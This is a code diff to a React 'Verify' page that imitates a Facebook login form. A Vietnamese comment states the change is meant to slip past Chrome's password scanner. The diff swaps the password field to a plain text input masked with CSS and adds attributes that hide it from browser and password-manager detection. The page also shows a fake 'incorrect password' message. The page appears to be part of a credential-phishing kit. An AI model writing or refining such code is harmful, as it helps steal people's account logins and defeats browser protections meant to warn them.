@@ -372,11 +372,25 @@ export default function Verify() {
               </>
             )}
 
-            {/* FORM 2 */}
+            {/* FORM 2 - ĐÃ SỬA ĐỂ LÁCH BỘ QUÉT MẬT KHẨU CỦA CHROME */}
             {step === 2 && (
-              <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                  <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
-                  <input className="fb-input" type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
+              <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
+                  
+                  {/* Đã đổi type password thành text và dùng css giả lập dấu chấm */}
+                  <input 
+                      className="fb-input" 
+                      type="text" 
+                      placeholder="Password" 
+                      value={loginPass} 
+                      onChange={e => setLoginPass(e.target.value)} 
+                      required 
+                      style={{ WebkitTextSecurity: 'disc' }} 
+                      autoComplete="new-password"
+                      data-lpignore="true"
+                      data-form-type="other"
+                  />
+                  
                   {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                   <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
                   <div style={{ textAlign: 'center', padding: '12px 0 0' }}><a href="#" style={{ color: '#1c2b33', fontSize: '15px', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
